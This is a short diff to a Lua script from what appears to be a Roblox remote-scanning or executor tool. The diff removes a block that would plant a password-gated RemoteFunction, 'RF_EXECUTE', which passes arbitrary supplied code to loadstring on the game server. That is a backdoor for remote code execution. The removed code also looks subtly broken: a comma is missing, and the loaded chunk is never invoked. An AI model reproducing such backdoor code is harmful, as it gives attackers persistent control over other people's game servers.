@@ -2753,21 +2753,6 @@ local function fireRemoteEvent(code)
 		FinishedFound = false
 	
 		task.spawn(findRemote)
-		if foundEvent then 
-		if remoteEvent then 
-			remoteEvent:Destroy()
-		elseif remoteFunction then 
-			remoteFunction:Destroy()
-		end
-		   fireRemoteEvent([[
-		local rem = Instance.new("RemoteFunction"game.ReplicatedStorage)
-		rem.Name = "RF_EXECUTE"
-		rem.OnServerInvoke = (function(p,a,b) 
-		    if a=="starlightTSS" then 
-			loadstring(b)
-		  end
-		end)]])
-		end
 		script.Parent.Framee.scan.Visible = false
 		script.Parent.Framee.Check.Visible = true
 		script.Parent.stat.ImageColor3 = Color3.fromRGB(255, 184, 71)
